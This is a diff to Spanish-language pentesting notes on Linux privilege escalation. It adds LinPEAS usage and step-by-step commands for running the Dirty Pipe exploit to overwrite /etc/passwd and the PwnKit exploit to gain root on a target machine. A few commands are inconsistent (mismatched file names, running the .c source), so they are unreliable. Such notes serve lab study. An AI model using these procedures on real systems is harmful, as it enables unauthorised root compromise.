@@ -2,12 +2,12 @@
 
 Tags: #Linux #Escalada #Root #Privilegios #Capabilities #SUID #LSE #PSPY #LinPEAS #CRON #Netstat #GCC
 
-* HackTricks: [Hacktricks](https://book.hacktricks.xyz/welcome/readme)
-* GTFOBins: [GTFOBins](https://gtfobins.github.io/)
+* [Hacktricks](https://book.hacktricks.xyz/welcome/readme)
+* [GTFOBins](https://gtfobins.github.io/)
 
 ## Enumeracion Tools Automaticas Enumeration
 
--   **Herramienta LSE**: [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
+-   [LSE](https://github.com/diego-treitos/linux-smart-enumeration)
 
 Esta herramienta nos ayudar a identificar vulnerabilidades para poderla explotar y escalar privilegios.
 	**lse.sh** > Mirar en modo Raw
@@ -22,7 +22,7 @@ Esta herramienta nos ayudar a identificar vulnerabilidades para poderla explotar
 ``` 
 
 
--   **Herramienta PSPY**: [https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)
+-   [PSPY](https://github.com/DominicBreuker/pspy)
 
 Esta herramienta nos ayudara a identificar tareas, procesos que se estan ejecutando.
 	Releases > Improved troubleshooting > **pspy64** -> Binario que debemos de descargar
@@ -32,8 +32,15 @@ Esta herramienta nos ayudara a identificar tareas, procesos que se estan ejecuta
 ```
 
 
-* **Herramienta LinPEAS**: 
+* [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)     ->     Para descragar el binario debemos de ir a **'Quick Start > the releases page > linpeas.sh'**
+```bash
+❯ chmod 777 linpeas.sh                   # Agregamos los privilegios para poder ejecutarlo en la maquina victima
+❯ ./linpeas.sh                           # Para ejecutar el binario, podremos ver los diferentes colores y ahi podremos ver en donde es mas facil poder hacer el (PE=Privilege Escalation)
 
+	# Podremos encontrar archivos o passwds
+
+❯ ./linux-exploit-suggester.sh           # Podemos ver los CVE potenciales
+```
 
 
 ## Manual 
@@ -72,25 +79,42 @@ Esta herramienta nos ayudara a identificar tareas, procesos que se estan ejecuta
 
 #### gcc
 
-* [Dirty-Pipe]()
+* [Dirty-Pipe-Arinerron](https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit)
 
 ```bash
-❯ which gcc                                       #
+❯ which gcc                                       
 
-	# /usr/bin/gcc = Podemos usar el Dirty-Pipe el cual nos ayudara a sobre-escribir el /etc/passwd 
+	# /usr/bin/gcc = El Dirty-Pipe nos ayudara a sobre-escribir el ''/etc/passwd' 
+	# En la pagina de Arinerron nos vamos a 'exploit.c' despues le damos a RAW y copiamos el contenido en un archivo llamado 'priv.c' en la maquina victima en el dir '/tmp'
+
+❯ gcc privesc.c -o privesc                       # Asi lo compilamos en la maquina victima
+❯ ./privesc.c                                    # Ejecutamos el binario y nos convierte en root, ya que coloca a 'aaron' como usuario root y su passwd 'aaron'
+❯ su root                                        # Cambiar a usuario root con el nombre aaron seteado
 ```
 
 #### Privilegios SUID
 
-* **GTFOBins:** [GTFOBins](https://gtfobins.github.io/)
+* [GTFOBins](https://gtfobins.github.io/)
+* [Pkexec-PwnKit](https://github.com/berdav/CVE-2021-4034)
+
 Podemos ver en esa pagina que comando podemos usar si encontramos un permiso SUID
 ```bash 
 ❯ find / -perm -4000 -ls 2>/dev/null               # Buscaremos por privilegios SUID, con ls = Miramos los privilegios y buscamos los de root
 
-	# /usr/bin/pkexec 
-	# 
+	# /usr/bin/pkexec = Vulnerable al PwnKit           
 ```
 
+```bash
+# Para el Pkexec en la maquina de atacante 
+❯ git clone https://github.com/berdav/CVE-2021-4034          # Nos descargara un archivo el cual debemos de comprimir y pasarlo a la maquina victima por http
+❯ zip -r comprimido.zip CVE-2021-4034/                       # Comprimimos el archivo CVE y le ponemos de nombre 'comprimido.zip' 
+
+# Para el Pkexec en la maquina victima
+❯ unzip comprimido.zip                                       # Descomprimimos el archivo .zip
+❯ cd CVE-2021-4034/                                          # Nos dirigimos al directorio
+❯ make                                                       # Compilamos todo lo que se encuentra ahi
+❯ ./cve-2021-4034                                            # Ejecutamos el archivo .sh y con eso nos convertimos en root
+```
 
 #### Capabilities
 
